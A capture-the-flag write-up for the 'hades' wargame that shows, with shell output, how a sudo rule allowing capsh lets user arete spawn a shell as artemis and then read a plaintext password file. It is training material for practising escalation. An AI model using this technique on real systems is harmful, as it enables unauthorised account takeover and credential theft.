# 0x09
This write-up explains the steps taken to complete mission 0x09 on hades@hackmyvm.eu, starting from user `arete` and escalating to `artemis`.

## Mission
We read the mission first:
```bash
arete@hades:~$ cat mission.txt 
################
# MISSION 0x09 #
################

## EN ##
The user artemis allows us to use some binary on her behalf. Its a gift... 
```
The mission clue pointed to a specific binary "gift" provided by the user `artemis`.

## Method of solving
We check the current and confirm the presence of the mission file and flag, then inspect our available sudo privileges.
```bash
arete@hades:~$ ls -la
total 32
drwxr-x--- 2 root  arete 4096 Apr  5  2024 .
drwxr-xr-x 1 root  root  4096 Apr  5  2024 ..
-rw-r--r-- 1 arete arete  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 arete arete 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 arete arete  807 Apr 23  2023 .profile
-rw-r----- 1 root  arete   22 Apr  5  2024 flagz.txt
-rw-r----- 1 root  arete  227 Apr  5  2024 mission.txt
```
Using `sudo -l`, we discover that the user `arete` was permitted  to run the `/sbin/capsh` binary as user `artemis` without  requiring a password.
```bash
arete@hades:~$ sudo -l
Matching Defaults entries for arete on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User arete may run the following commands on hades:
    (artemis) NOPASSWD: /sbin/capsh
```
`/sbin/capsh`: this is the `capsh` (capabilities shell) program, a tool that allows you to spawn a shell with specific Linux capabilities.

By executing `capsh` with the `--` argument with while specifying the target user with `sudo`, we are able to spawn an interactive shell with `artemis`'s privileges. Because when used with `capsh`, the `--` typically means 'end of option list' and spawn a default shell.
```bash
arete@hades:~$ sudo -u artemis /sbin/capsh --
artemis@hades:/pwned/arete$ id
uid=2051(artemis) gid=2051(artemis) groups=2051(artemis)
artemis@hades:/pwned/arete$ 
```

When we have a shell as `artemis`, we need to find her actual login password to establish a persistent session. We search the filesystem for any files related to her account.
```bash
artemis@hades:/pwned/arete$ find / -name "*artemis*" 2>/dev/null
/usr/share/artemis_pass.txt
/pwned/artemis
artemis@hades:/pwned/arete$ cat /usr/share/artemis_pass.txt 
HIiaojeORLaJBVSPDDCZ
```
**Explanation:**
- `sudo -u artemis`: This command instructs the system to run the subsequent binary with the identity and permissions of the user artemis.
- **`capsh` (Capability Shell)**: A tool primarily used for exploring and debugging Linux capabilities. It is a well-known binary in privilege escalation because it has a built-in function to drop into a shell.
- **The `--` Flag**: This argument tells capsh to stop processing further options and launch an interactive shell. Since it was invoked via sudo, the new shell inherited the UID of artemis.

Using the identified password, we successfully logged in via SSH to user `artemis`.
## Key command
`sudo -u artemis /sbin/capsh --`


***You are welcome!***
